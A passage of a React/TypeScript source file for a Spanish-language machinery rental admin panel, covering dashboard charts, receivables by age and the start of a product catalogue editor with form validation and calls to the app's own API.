      if (saldo <= 0) continue
      deApartados += saldo
      const atraso = p.fecha_estimada_entrega ? dias(p.fecha_estimada_entrega) : 0
      masViejo = Math.max(masViejo, atraso)
      sumar(saldo, atraso)
    }
    return { tramos, cuenta, deRentas, deApartados, masViejo, total: deRentas + deApartados }
  })()
  const TRAMOS_CARTERA = [
    { clave: 'vigente' as const, etiqueta: 'Al corriente', color: 'var(--chart-renta)' },
    { clave: 'reciente' as const, etiqueta: 'Vencido, ≤30 días', color: 'var(--chart-taller)' },
    { clave: 'viejo' as const, etiqueta: 'Vencido, +30 días', color: 'var(--c-vencida)' },
  ]

  const panel = 'bg-surface border border-edge rounded-xl shadow-[0_1px_3px_rgba(33,29,22,0.04)]'

  return (
    <div className="grid grid-cols-1 lg:grid-cols-[2fr_1fr] gap-2.5 items-start">
      {/* ── Columna izquierda ── */}
      <div className="flex flex-col gap-2.5 min-w-0">
        {/* Encabezado. Antes esto era un degradado AZUL con los hex a mano, en un
            producto que tiene UN acento y es dorado: un color que no significaba
            nada, ocupando el lugar más visible de la pantalla.

            Y la jerarquía estaba al revés. "Bienvenido, admin" era el texto más
            grande del panel; el cajero ya sabe cómo se llama. Lo que viene a ver
            —de pie, con un cliente enfrente— es CUÁNTO ENTRÓ HOY. Ese número es
            ahora el punto focal y gana por tamaño, peso y aire, no por color. */}
        <div className={`${panel} px-8 py-7 flex items-end justify-between gap-6 flex-wrap`}>
          <div className="min-w-0">
            <div className="text-[11px] font-bold uppercase tracking-[0.08em] text-mute">Ingresos de hoy</div>
            <div className="text-[44px] leading-none font-extrabold text-ink mt-2.5 tabular-nums"><Monto valor={ingresosHoy} decimales={0} /></div>
            <div className="text-[13px] text-mute mt-2.5 first-letter:uppercase">{dateStr}</div>
          </div>
          {/* El saludo y el reloj bajan a su lugar: contexto, no titular. */}
          <div className="text-right shrink-0 ml-auto">
            <div className="text-[13.5px] font-bold text-ink">Hola, {nombre}</div>
            <RelojVivo />
            <div className="text-[12.5px] text-mute mt-1 tabular-nums">{ventasActivas.length} ventas registradas</div>
          </div>
        </div>

        {/* El Resumen tenía TRES dibujos distintos de "tarjeta con un número"
            —estas cuatro, las cinco de abajo y las de cada sección— en la misma
            pantalla. Ahora las tres son la misma pieza (`KpiGrid`): cambiar el
            aspecto de una cifra se hace en un solo lugar y ninguna se queda
            atrás. Lo que cambia entre filas es el DATO, no el dibujo. */}
        <KpiGrid items={overviewStats} />

        {/* Requiere tu atención: dinero y operación pendientes; cada tarjeta lleva a su módulo */}
        <div>
          <div className="flex items-center gap-2 mb-2 px-0.5">
            <span className="text-[11px] font-bold uppercase tracking-[0.08em] text-mute">Requiere tu atención</span>
          </div>
          <KpiGrid
            items={pendientes.map(p => ({
              label: p.label, value: p.value, helper: p.sub,
              tone: p.tono, emphasis: p.urgente,
              icon: p.icon, onClick: () => go(p.ir), accion: `Ir a ${p.label.toLowerCase()}`,
            }))}
          />
        </div>

        {/* La gráfica que reemplazó a las tareas y al calendario: ninguno de
            los dos decía nada del negocio —uno era una libreta que solo vivía en
            ese navegador, el otro un calendario sin un solo evento—. Este espacio
            ahora contesta "¿cómo vamos este mes y de dónde viene el dinero?". */}
        <GraficaIngresos
          dias={metrics?.ingresos_por_dia || []}
          previo={metrics?.ingresos_periodo_previo || 0}
          panel={panel}
        />

        {/* ── Qué produce el dinero ──
            La serie de arriba dice CUÁNTO entró; esta dice DE QUÉ. Son los seis
            modelos que más dejaron en el mismo tramo de 30 días, con su mezcla:
            un modelo que produce $80,000 rentándose no es el mismo negocio que
            uno que produce $80,000 vendiéndose una vez —el primero lo vuelve a
            hacer el mes que entra—. Es la tarjeta que contesta qué conviene
            comprar. */}
        <div className={`${panel} p-5`}>
          <div className="flex items-start justify-between gap-3 flex-wrap mb-4">
            <div>
              <div className="text-base font-extrabold text-ink">Qué produce el dinero</div>
              <div className="text-[13px] text-mute mt-1">Los que más dejaron en 30 días, y de dónde vino</div>
            </div>
            <div className="flex items-center gap-3">
              {SERIES_INGRESO.map(s => (
                <div key={s.clave} className="flex items-center gap-1.5">
                  <span className="w-2.5 h-2.5 rounded-[3px] shrink-0" style={{ background: s.color }} />
                  <span className="text-[12.5px] text-mute">{s.etiqueta}</span>
                </div>
              ))}
            </div>
          </div>
          {topEquipos.length ? (
            <BarrasRanking
              datos={topEquipos.map(e => ({
                clave: e.modelo, etiqueta: e.modelo,
                valores: { rentas: e.rentas, ventas: e.ventas },
              }))}
              series={SERIES_INGRESO}
              resumen={`Los ${topEquipos.length} equipos que más ingresos dejaron en los últimos 30 días`}
              tituloTabla="Ingresos por equipo, últimos 30 días"
            />
          ) : (
            <div className="py-10 grid place-items-center text-center border border-dashed border-edge rounded-xl">
              <div>
                <div className="text-[14px] font-bold text-ink">Todavía no hay con qué armar el ranking</div>
                <div className="text-[12.5px] text-mute mt-1">Aparece en cuanto se cobre una renta o una venta.</div>
              </div>
            </div>
          )}
        </div>

        {/* ── Máquina trabajando ──
            El inventario de la derecha dice cómo está la flota HOY; esto dice
            cómo estuvo. Aquí sí va curva y no columnas: la ocupación es un
            estado continuo —una máquina que salió el lunes y volvió el viernes
            estuvo rentada los cinco días—, así que la línea entre dos puntos
            existe de verdad. En los ingresos no. */}
        {ocupacion.length > 0 && (
          <div className={`${panel} p-5`}>
            <div className="flex items-start justify-between gap-3 flex-wrap mb-4">
              <div>
                <div className="text-base font-extrabold text-ink">Máquina trabajando</div>
                <div className="text-[13px] text-mute mt-1">Unidades en obra, día por día</div>
              </div>
              <div className="text-right">
                <div className="text-[22px] font-extrabold text-ink leading-none tabular-nums">{ocupPct}%</div>
                <div className="text-[11.5px] text-mute mt-1">
                  {ocupHoy?.rentadas ?? 0} de {ocupHoy?.flota ?? 0} hoy
                </div>
              </div>
            </div>
            <AreaOcupacion
              datos={ocupacion}
              color="var(--chart-renta)"
              etiquetaSerie="En obra"
              alto={140}
              formato={n => `${n} ${n === 1 ? 'unidad' : 'unidades'}`}
              formatoEjeX={diaCorto}
              resumen={`Unidades rentadas por día en los últimos ${ocupacion.length} días. Hoy ${ocupHoy?.rentadas ?? 0} de ${ocupHoy?.flota ?? 0}.`}
              tituloTabla="Unidades rentadas por día, últimos 30 días"
            />
          </div>
        )}

        {/* Movimientos recientes */}
        <div className={`${panel} overflow-hidden`}>
          <div className="px-5 py-5 border-b border-edge">
            <div className="text-base font-extrabold text-ink">Movimientos recientes</div>
            <div className="text-[13px] text-mute mt-1">Últimas rentas y ventas registradas</div>
          </div>
          {/* En celular la columna "actualizado" no cabe como columna: la fecha
              se baja debajo del nombre del equipo y quedan solo dos columnas. */}
          <div className="grid grid-cols-[1.6fr_auto] sm:grid-cols-[1.6fr_1fr_1.1fr] gap-2 px-4 sm:px-5 py-2.5 text-[11.5px] font-bold tracking-wide text-mute border-b border-edge">
            <div>EQUIPO</div><div>ESTADO</div><div className="hidden sm:block">ACTUALIZADO</div>
          </div>
          {moves.length === 0 && <div className="px-5 py-8 text-center text-mute text-sm">Sin movimientos aún.</div>}
          {moves.map((m, i) => (
            <div key={i} className="grid grid-cols-[1.6fr_auto] sm:grid-cols-[1.6fr_1fr_1.1fr] gap-2 items-center px-4 sm:px-5 py-3.5 border-b border-edge hover:bg-surface-2">
              <div className="flex items-center gap-2.5 font-bold text-sm text-ink min-w-0">
                {/* Aquí había un cuadro gris vacío de 30px: un hueco esperando
                    una foto que nunca llegó. Ahora lleva el dibujo del
                    movimiento —renta o venta— con SU color, que es el mismo de
                    la insignia de la derecha: el ojo empareja los dos extremos
                    del renglón sin leer. */}
                <div className="w-[30px] h-[30px] rounded-lg shrink-0 grid place-items-center" style={{ background: m.bg, color: m.color }}>
                  <svg className="w-[15px] h-[15px]" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round">
                    {m.esRenta
                      ? <><rect x="3" y="4.5" width="18" height="16" rx="2" /><path d="M3 9h18M8 3v3m8-3v3" /></>
                      : <><path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" /></>}
                  </svg>
                </div>
                <div className="min-w-0">
                  <span className="block truncate">{m.name} <span className="font-mono text-[11px] text-mute font-normal">{m.code}</span></span>
                  <span className="sm:hidden block text-[11px] text-mute font-mono font-normal">{(m.ts || '').slice(0, 10) || '—'}</span>
                </div>
              </div>
              <div><span className="text-xs font-bold px-2 py-1 rounded-md whitespace-nowrap" style={{ color: m.color, background: m.bg }}>{m.status}</span></div>
              <div className="hidden sm:block text-[13px] text-mute font-mono">{(m.ts || '').slice(0, 10) || '—'}</div>
            </div>
          ))}
        </div>
      </div>

      {/* ── Columna derecha ── */}
      <div className="flex flex-col gap-2.5 min-w-0">
        {/* Indicadores (dona) */}
        <div className={`${panel} p-5`}>
          <div className="text-base font-extrabold text-ink">Indicadores</div>
          <div className="text-[13px] text-mute mt-1 mb-5">Rendimiento operativo</div>
          {/* La dona reparte las unidades en sus tres estados, con el mismo color
              que la leyenda de abajo. Antes pintaba "disponibles" de dorado, que
              es el color de mantenimiento: el color contradecía el dato. */}
          <div className="mb-5">
            <Dona
              datos={tramosFlota}
              centroValor={`${availabilityPct}%`}
              centroEtiqueta="disponible"
              formato={n => `${n} ${n === 1 ? 'unidad' : 'unidades'}`}
              tamano={168}
              resumen={`${availabilityPct}% disponibles: ${disp} disponibles, ${rent} rentadas, ${mant} en mantenimiento`}
            />
          </div>
          <div className="flex flex-col gap-2">
            {indicators.map((ind, i) => (
              <div key={i} className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full shrink-0" style={{ background: ind.color }} />
                  <div>
                    <div className="text-[13.5px] font-bold text-ink">{ind.label}</div>
                    <div className="text-[11.5px] text-mute">{ind.sub}</div>
                  </div>
                </div>
                {/* El número va en tinta, no en el color de la serie: el ocre
                    como TEXTO da 3.4:1 y no pasa. La identidad la carga el
                    punto de al lado, que para eso está. */}
                <div className="text-[13.5px] font-extrabold text-ink tabular-nums">{ind.value}</div>
              </div>
            ))}
          </div>
          {/* El tamaño de la flota vivía en la tarjeta de abajo, que se retiró
              por repetir esta misma dona. Es una cifra, y su lugar es aquí. */}
          <div className="border-t border-edge mt-4 pt-3.5 text-[12px] text-mute">
            {total} {total === 1 ? 'unidad' : 'unidades'} en la flota
          </div>
        </div>

        {/* Ingresos por mes */}
        <div className={`${panel} p-5`}>
          <div className="text-base font-extrabold text-ink">Ingresos por mes</div>
          <div className="text-[13px] text-mute mt-1 mb-4">Últimos 6 meses</div>
          {/* Antes eran seis barras mudas de un solo color: sin eje, sin cifras
              e ignorando que el dato ya venía separado en renta y venta. Ahora
              es la misma gráfica de los 30 días —mismo eje, mismo globito,
              mismos colores—, solo que con seis columnas en vez de treinta. */}
          <div className="mb-4">
            <BarrasApiladas
              datos={revByMonth.map(b => ({
                clave: b.label, etiquetaX: b.label, titulo: b.label,
                valores: { rentas: b.rentas, ventas: b.ventas },
              }))}
              series={SERIES_INGRESO}
              alto={120}
              anchoMaxBarra={34}
              resumen={`Ingresos de los últimos seis meses. Mejor mes: ${money0(maxRev)}.`}
              tituloTabla="Ingresos por mes, últimos seis meses"
            />
          </div>
          {/* gap-3 y 17px: a 19px con gap-1.5, "$436,000" y "6/6" se tocaban
              y la etiqueta de en medio se partía encima de la vecina. */}
          <div className="grid grid-cols-3 gap-3 border-t border-edge pt-4">
            <div className="min-w-0"><div className="text-[17px] font-extrabold text-ink tabular-nums">{money0(ingresosTotales)}</div><div className="text-[11.5px] text-mute mt-1 leading-snug">Ingresos totales</div></div>
            <div className="min-w-0"><div className="text-[17px] font-extrabold text-libre tabular-nums">{mesesPositivos}/6</div><div className="text-[11.5px] text-mute mt-1 leading-snug">Meses con ingresos</div></div>
            <div className="min-w-0"><div className="text-[17px] font-extrabold text-ink tabular-nums">{money0(maxRev)}</div><div className="text-[11.5px] text-mute mt-1 leading-snug">Mejor mes</div></div>
          </div>
        </div>

        {/* ── Dinero por cobrar ──
            Aquí vivía "Inventario por estado": las mismas tres cifras de la dona
            de arriba dibujadas otra vez, en barras. Dos veces el mismo dato es
            una tarjeta desperdiciada en la única columna angosta del Resumen.

            Lo que ocupa su lugar es lo que en ningún lado se decía: cuánto se
            debe y DESDE CUÁNDO. El globito de "Adeudos" solo dice cuántos, y un
            adeudo de tres días no es uno de tres meses. */}
        <div className={`${panel} p-5`}>
          <div className="text-base font-extrabold text-ink">Dinero por cobrar</div>
          <div className="text-[13px] text-mute mt-1 mb-4">Lo que falta entrar, por antigüedad</div>

          <div className="flex items-end gap-2.5 flex-wrap mb-4">
            <div className="text-[30px] font-extrabold text-ink leading-none tabular-nums">{money0(cartera.total)}</div>
            {cartera.masViejo > 0 && (
              <div className="text-[12.5px] font-bold mb-0.5" style={{ color: 'var(--c-vencida)' }}>
                lo más viejo, {cartera.masViejo} {cartera.masViejo === 1 ? 'día' : 'días'}
              </div>
            )}
          </div>

          {cartera.total > 0 ? (
            <>
              {/* Una sola barra repartida: la proporción se lee de un golpe y no
                  hay que comparar tres alturas. */}
              <div className="flex h-2.5 rounded-full overflow-hidden bg-surface-2 mb-3.5" role="img"
                aria-label={TRAMOS_CARTERA.map(t => `${t.etiqueta}: ${money0(cartera.tramos[t.clave])}`).join('; ')}>
                {TRAMOS_CARTERA.map(t => cartera.tramos[t.clave] > 0 && (
                  <div key={t.clave}
                    className="h-full barra-crece first:rounded-l-full last:rounded-r-full"
                    style={{
                      width: `${(cartera.tramos[t.clave] / cartera.total) * 100}%`,
                      background: `linear-gradient(to bottom, color-mix(in srgb, ${t.color} 88%, white), ${t.color})`,
                      boxShadow: 'inset 0 1px 0 rgba(255,255,255,0.30)',
                    }} />
                ))}
              </div>
              <div className="flex flex-col gap-2.5">
                {TRAMOS_CARTERA.map(t => (
                  <div key={t.clave} className="flex items-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-[3px] shrink-0" style={{ background: t.color }} />
                    <span className="text-[13px] text-ink">{t.etiqueta}</span>
                    <span className="text-[11.5px] text-mute">
                      {cartera.cuenta[t.clave] || 0}
                    </span>
                    <span className="ml-auto text-[13.5px] font-extrabold text-ink tabular-nums">
                      {money0(cartera.tramos[t.clave])}
                    </span>
                  </div>
                ))}
              </div>
            </>
          ) : (
            <div className="py-8 text-center border border-dashed border-edge rounded-xl">
              <div className="text-[14px] font-bold text-ink">Nadie debe nada</div>
              <div className="text-[12.5px] text-mute mt-1">Todo lo entregado está pagado.</div>
            </div>
          )}

          {/* De dónde viene ese dinero. Va abajo y en texto: es el segundo dato,
              no el que se busca al abrir la tarjeta. */}
          <div className="grid grid-cols-2 gap-3 border-t border-edge pt-4 mt-4">
            <button onClick={() => go('adeudos')} className="text-left">
              <div className="text-[17px] font-extrabold text-ink tabular-nums">{money0(cartera.deRentas)}</div>
              <div className="text-[11.5px] text-mute mt-1 leading-snug">De rentas</div>
            </button>
            <button onClick={() => go('pedidos')} className="text-left">
              <div className="text-[17px] font-extrabold text-ink tabular-nums">{money0(cartera.deApartados)}</div>
              <div className="text-[11.5px] text-mute mt-1 leading-snug">De apartados</div>
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

/* ════════════════════════════════════════
   EQUIPOS CRUD
════════════════════════════════════════ */
function EquiposAdmin({ equipos, categorias, tipos, marcas, reload, notify, cargando }: {
  equipos: Equipo[]; categorias: Option[]; tipos: Option[]; marcas: Option[]
  reload: () => void; notify: Notify
  /** La lista todavía viene en camino: el vacío no es un vacío de verdad. */
  cargando?: boolean
}) {

  // Clasificación exprés desde la lista: tres toques (categoría → tipo → marca)
  // con los modales de la casa, sin abrir el formulario completo.
  async function clasificarEquipo(e: Equipo) {
    const pedirUno = async (titulo: string, lista: Option[], actualId?: number) => {
      const sel = await elegir({
        titulo, mensaje: e.modelo,
        opciones: [
          ...lista.map(o => ({ valor: String(o.id), label: o.nombre, detalle: o.id === actualId ? 'Actual' : undefined })),
          { valor: '', label: 'Sin asignar' },
        ],
      })
      return sel === null ? null : (sel[0] || '')
    }
    const cat = await pedirUno('Categoría', categorias, e.categoria?.id); if (cat === null) return
    const tip = await pedirUno('Tipo', tipos, e.tipo?.id); if (tip === null) return
    const mar = await pedirUno('Marca', marcas, e.marca?.id); if (mar === null) return
    try {
      await api.patch(`/equipos/${e.id}/`, {
        categoria_id: cat ? Number(cat) : null,
        tipo_id: tip ? Number(tip) : null,
        marca_id: mar ? Number(mar) : null,
      })
      notify('Clasificación guardada')
      reload()
    } catch { notify('No se pudo guardar la clasificación', 'err') }
  }
  const empty: Equipo = { modelo: '', descripcion: '', precio_dia: '', precio_semana: '', precio_mes: '', precio_venta: '', especificaciones: [], que_incluye: [], promo_pct: 0, dias_entrega_pedido: '', garantia_meses: 3 }
  const [form, setForm] = useState<Equipo>(empty)
  // Helpers del editor de especificaciones técnicas (etiqueta → valor)
  const specs = form.especificaciones || []
  const setSpecs = (s: { etiqueta: string; valor: string }[]) => setForm(f => ({ ...f, especificaciones: s }))
  const addSpec = () => setSpecs([...specs, { etiqueta: '', valor: '' }])
  const setSpec = (i: number, k: 'etiqueta' | 'valor', v: string) => setSpecs(specs.map((s, j) => j === i ? { ...s, [k]: v } : s))
  const removeSpec = (i: number) => setSpecs(specs.filter((_, j) => j !== i))
  // Sugerencias rápidas (las de una ficha típica de generador/maquinaria)
  const SPEC_SUGERIDAS = ['Frecuencia', 'Peso bruto', 'Dimensiones', 'Tipo de motor', 'Sistema de arranque', 'Potencia del motor', 'Capacidad de aceite', 'Modelo de motor', 'Voltaje', 'Potencia nominal', 'Capacidad de combustible', 'Nivel de ruido']
  const [imageFile, setImageFile] = useState<File | null>(null)
  const [fichaFile, setFichaFile] = useState<File | null>(null)
  const [previewFicha, setPreviewFicha] = useState(false)
  const [saving, setSaving] = useState(false)
  const [invEquipo, setInvEquipo] = useState<Equipo | null>(null)
  const [formOpen, setFormOpen] = useState(false)
  const [q, setQ] = useState('')
  const [cond, setCond] = useState<'nueva' | 'seminueva'>('seminueva')
  const [cantidad, setCantidad] = useState('1')
  const [esSobrePedido, setEsSobrePedido] = useState(false)   // alta de venta SIN stock (sobre pedido)
  const editing = Boolean(form.id)

  const filtrados = equipos.filter(e => {
    if (!q.trim()) return true
    const t = `${e.modelo} ${e.categoria?.nombre || ''} ${e.marca?.nombre || ''} ${e.tipo?.nombre || ''}`.toLowerCase()
    return t.includes(q.trim().toLowerCase())
  })
  // El catálogo de modelos también crece: se pagina la tabla y los indicadores
  // de arriba siguen sumando sobre TODO el catálogo.
  const { enPantalla, ancla, props: pagProps } = usePaginado(filtrados, undefined, [q])
  const totalDisponibles = equipos.reduce((a, e) => a + (e.stock_disponible ?? 0), 0)
  const sinPrecio = equipos.filter(e => !num(e.precio_dia) && !num(e.precio_venta)).length

  const puede = usePuede()
  const puedeEditar = puede('editar_catalogo')   // el técnico consulta el catálogo, no lo cambia

  function openNew() { setForm(empty); setImageFile(null); setFichaFile(null); setCond('seminueva'); setCantidad('1'); setEsSobrePedido(false); setFormOpen(true) }
  function openEdit(e: Equipo) { setForm({ ...e }); setCond(((e as any).condicion as 'nueva' | 'seminueva') || 'nueva'); setImageFile(null); setFichaFile(null); setFormOpen(true) }

  async function save() {
    if (!form.modelo.trim()) { notify('El modelo es obligatorio', 'err'); return }
    // Venta exige al menos una característica (con ella se arma la ficha del cliente).
    if (cond === 'nueva' && !(form.especificaciones || []).some(s => s.etiqueta.trim() && s.valor.trim())) {
      notify('Un equipo de venta necesita al menos una característica', 'err'); return
    }
    /* Ninguna máquina sale del patio gratis. El servidor lo impone igual (la
       regla vive en el modelo), pero avisar aquí evita el viaje y dice
       exactamente qué falta según el modo: una de venta necesita su precio; una
       de renta, al menos una tarifa. */
    const precioBueno = (v: unknown) => Number(v) > 0
    if (cond === 'nueva' && !precioBueno(form.precio_venta)) {
      notify('Ponle el precio de venta: tiene que ser mayor a 0', 'err'); return
    }
    if (cond !== 'nueva' && !['precio_dia', 'precio_semana', 'precio_mes'].some(k => precioBueno(form[k as keyof typeof form]))) {
      notify('Ponle al menos una tarifa de renta (día, semana o mes) mayor a 0', 'err'); return
    }
    setSaving(true)
    const fd = new FormData()
    fd.append('modelo', form.modelo)
    if (form.descripcion) fd.append('descripcion', form.descripcion)
    // La condición define el modo del equipo: nueva = venta, seminueva = renta.
    fd.append('condicion', cond)
    // Nueva solo se vende: no se mandan precios de renta aunque hayan quedado escritos.
    const soloVenta = cond === 'nueva'
    const camposPrecio = soloVenta
      ? (['precio_venta'] as const)
      : (['precio_dia', 'precio_semana', 'precio_mes', 'precio_venta'] as const)
    for (const k of camposPrecio) {
      const v = form[k]
      if (v !== '' && v != null) fd.append(k, String(v))
    }
    // Garantía al comprador. Se manda siempre, incluso en 0: dejar de mandarla
    // haría imposible QUITARLE la garantía a una máquina que ya la tenía.
    const meses = (form as any).garantia_meses
    if (meses !== '' && meses != null) {
      fd.append('garantia_meses', String(Math.max(0, Math.min(120, Number(meses) || 0))))
    }
    if (form.categoria?.id) fd.append('categoria_id', String(form.categoria.id))
    if (form.tipo?.id) fd.append('tipo_id', String(form.tipo.id))
    if (form.marca?.id) fd.append('marca_id', String(form.marca.id))
    if (imageFile) fd.append('imagen', imageFile)
    if (fichaFile) fd.append('ficha_tecnica', fichaFile)
    // Especificaciones técnicas (el backend descarta las filas incompletas)
    fd.append('especificaciones', JSON.stringify(
      (form.especificaciones || []).filter(s => s.etiqueta.trim() && s.valor.trim())
    ))
    // "Qué incluye": una línea por punto (formato libre "Título: detalle")
    fd.append('que_incluye', JSON.stringify((form.que_incluye || []).map(l => l.trim()).filter(Boolean)))
    fd.append('promo_pct', String(Math.max(0, Math.min(90, Number(form.promo_pct) || 0))))
    // Días que tarda el proveedor si esta máquina va sobre pedido (0 = usar el global).
    if (soloVenta) fd.append('dias_entrega_pedido', String(Math.max(0, Math.min(365, Number(form.dias_entrega_pedido) || 0))))

    try {
      const method = editing ? 'patch' : 'post'
      const url = editing ? `/equipos/${form.id}/` : '/equipos/'
      const res = await api({ method, url, data: fd })

      // Al CREAR: generar las unidades de inventario en UNA llamada atómica
      // (el backend crea las N o ninguna; ya no es un bucle que traga errores).
      if (!editing) {
        const equipoId = res.data?.id
        // "Sobre pedido" (solo venta) = alta SIN stock: no se crean unidades.
        const n = (cond === 'nueva' && esSobrePedido) ? 0 : Math.max(1, Math.min(100, Number(cantidad) || 1))
        if (equipoId && n > 0) {
          try {
            const u = await api.post(`/equipos/${equipoId}/unidades/`, { condicion: cond, cantidad: n })
            const creadas = u.data?.cantidad ?? n
            notify(`Producto creado · ${creadas} unidad${creadas > 1 ? 'es' : ''} en inventario`)
          } catch {
            // El producto sí se creó; fallaron las unidades. Se dice la verdad.
            notify('Producto creado, pero sin unidades. Agrégalas desde Inventario.', 'err')
          }
        } else if (equipoId && cond === 'nueva') {
          // Sin unidades y de venta: nace como SOBRE PEDIDO (se ordena al proveedor;
          // la unidad se asigna al llegar). Al dar de alta stock, pasa a venta inmediata.
          notify('Producto creado sobre pedido, sin stock. Agrega unidades cuando lleguen.', 'warning')
        } else {
          notify('Producto creado')
        }
      } else {
        notify('Producto actualizado')
      }
      setForm(empty); setImageFile(null); setFichaFile(null); setFormOpen(false); reload()
    } catch (err: any) {
      notify(errorMsg(err, 'Error al guardar'), 'err')
    } finally {
      setSaving(false)
    }
  }

  async function del(id?: number) {
    if (!id || !await confirmar({ titulo: '¿Eliminar este producto?', mensaje: 'Se borra del catálogo. No se puede deshacer.', aceptar: 'Eliminar', tono: 'peligro' })) return
    api.delete(`/equipos/${id}/`)
      .then(() => { notify('Producto eliminado', 'neutro'); reload() })
      .catch(err => notify(err?.response?.data?.detail || 'Error al eliminar', 'err'))
  }

  const sel = (opts: Option[], current: Option | null | undefined, onPick: (o: Option | null) => void, placeholder: string) => (
    <select aria-label={placeholder}
      value={current?.id || ''}
      onChange={e => { const id = Number(e.target.value); onPick(id ? { id, nombre: opts.find(o => o.id === id)?.nombre || '' } : null) }}
      className={input}
    >
      <option value="" className="bg-surface">{placeholder}</option>
      {opts.map(o => <option key={o.id} value={o.id} className="bg-surface">{o.nombre}</option>)}
    </select>
  )

  const kpis = [
    { label: 'Productos', value: equipos.length },
    { label: 'Unidades disponibles', value: totalDisponibles },
    { label: 'Sin precio', value: sinPrecio, warn: sinPrecio > 0 },
  ]

  return (
    <div className="space-y-6">
      {/* KPIs */}
      <KpiGrid
        items={kpis.map(k => ({
          label: k.label,
          value: k.value,
          tone: (k as any).warn ? 'danger' : 'default',
          emphasis: Boolean((k as any).warn),
        }))}
      />

      {/* Tabla de productos */}
      <Card ref={ancla} className="overflow-hidden scroll-mt-24">
        {/* Toolbar */}
        <CardBarra titulo="Productos" cuenta={filtrados.length}>
          <div className="flex-1 flex items-center gap-3 sm:justify-end">
            <div className="relative flex-1 sm:max-w-xs">
              <svg className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-mute pointer-events-none" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2"><circle cx="9" cy="9" r="6" /><path d="M15 15l3 3" strokeLinecap="round" /></svg>
              <input aria-label="Buscar producto" value={q} onChange={e => setQ(e.target.value)} placeholder="Buscar producto..."
                className="campo campo-sm pl-10" />
            </div>
            {puedeEditar && (
              <button onClick={openNew} className="btn-acento shrink-0 inline-flex items-center gap-2 h-10 px-4 rounded-full text-[13.5px] font-bold">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24" strokeWidth="2.5"><path strokeLinecap="round" d="M12 5v14M5 12h14" /></svg>
                <span className="hidden sm:inline">Nuevo producto</span>
              </button>
            )}
          </div>
        </CardBarra>

        {/* Tabla */}
        <div className="overflow-x-auto">
          <table className="tabla-panel w-full min-w-[760px] text-left">
            <thead>
              <tr className="text-[10px] uppercase tracking-wider text-mute border-b border-edge">
                <th className="font-semibold px-5 py-3">Producto</th>
                <th className="font-semibold px-3 py-3">Clasificación</th>
                <th className="font-semibold px-3 py-3">Condición</th>
                <th className="font-semibold px-3 py-3 text-right">Precio/día</th>
                <th className="font-semibold px-3 py-3 text-right">Venta</th>
                <th className="font-semibold px-3 py-3 text-center">Unidades</th>
                <th className="font-semibold px-5 py-3 text-right">Acciones</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-edge">
              {enPantalla.map(e => {
                const disp = e.stock_disponible ?? 0
                const total = e.unidades_total ?? disp
                return (
                  <tr key={e.id} className="hover:bg-surface-2 transition-colors group">
                    {/* Producto */}
                    <td className="px-5 py-3">
                      <div className="flex items-center gap-3 min-w-0">
                        <div className="w-11 h-11 rounded-lg bg-surface-2 overflow-hidden shrink-0">
                          {e.imagen && <img src={resolveMediaUrl(e.imagen)} alt={e.modelo} className="w-full h-full object-cover" />}
                        </div>
                        <div className="min-w-0">
                          <p className="text-sm font-bold text-ink truncate">{e.modelo}</p>
                          {e.descripcion && <p className="text-xs text-mute truncate max-w-[220px]">{e.descripcion}</p>}
                        </div>
                      </div>
                    </td>
                    {/* Clasificación: clic para asignarla ahí mismo, sin abrir el formulario */}
                    <td data-col="Clasificación" className="px-3 py-3">
                      {(e.categoria || e.tipo || e.marca) ? (
                        <button onClick={() => clasificarEquipo(e)} className="text-left group/cl" title="Cambiar clasificación">
                          <p className="text-xs text-ink group-hover/cl:text-gold-ink transition-colors">{e.categoria?.nombre || '—'}</p>
                          <p className="text-[11px] text-mute">{[e.marca?.nombre, e.tipo?.nombre].filter(Boolean).join(' · ') || '—'}</p>
                        </button>
                      ) : (
                        <button onClick={() => clasificarEquipo(e)} className="text-[11px] px-2.5 py-1 rounded-md border border-dashed border-edge text-mute hover:text-gold-ink hover:border-gold/50 transition-colors">
                          Asignar
                        </button>
                      )}
                    </td>
                    {/* Condición */}
                    <td data-col="Condición" className="px-3 py-3">
                      <div className="flex flex-wrap gap-1">
                        {(e.condiciones || []).includes('nueva') && <span className="text-[9px] px-1.5 py-0.5 rounded bg-emerald-500/10 text-emerald-500 font-bold uppercase">Nuevo</span>}
                        {(e.condiciones || []).includes('seminueva') && <span className="text-[9px] px-1.5 py-0.5 rounded bg-blue-500/10 text-blue-500 font-bold uppercase">Semin.</span>}
                        {!(e.condiciones || []).length && <span className="text-[11px] text-mute">—</span>}
                      </div>
                    </td>
                    {/* Precio día */}
                    <td data-col="Precio/día" className="px-3 py-3 text-right whitespace-nowrap">
                      <span className="text-sm font-semibold text-price">${num(e.precio_dia).toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                    </td>
                    {/* Venta */}
                    <td data-col="Venta" className="px-3 py-3 text-right whitespace-nowrap">
                      <span className="text-sm text-ink">{num(e.precio_venta) ? `$${num(e.precio_venta).toLocaleString('en-US', { minimumFractionDigits: 2 })}` : '—'}</span>
                    </td>
                    {/* Unidades (cada máquina es una pieza única, no stock fungible) */}
                    <td data-col="Unidades" className="px-3 py-3 text-center whitespace-nowrap">
                      <div>
                        <span className="text-sm font-bold text-ink">{total}</span>
                        <span className="text-[11px] text-mute"> und.</span>
                        <p className={`text-[10px] font-semibold ${disp > 0 ? 'text-emerald-500' : 'text-mute'}`}>{disp} disp.</p>
                      </div>
                    </td>
                    {/* Acciones */}
                    <td className="px-5 py-3">
                      <div className="flex items-center justify-end gap-1.5">
                        <button onClick={() => setInvEquipo(e)} title="Inventario" className="px-3 py-1.5 rounded-lg bg-gold-soft text-gold-ink text-xs font-semibold hover:bg-gold/20 transition-colors flex items-center gap-1.5">
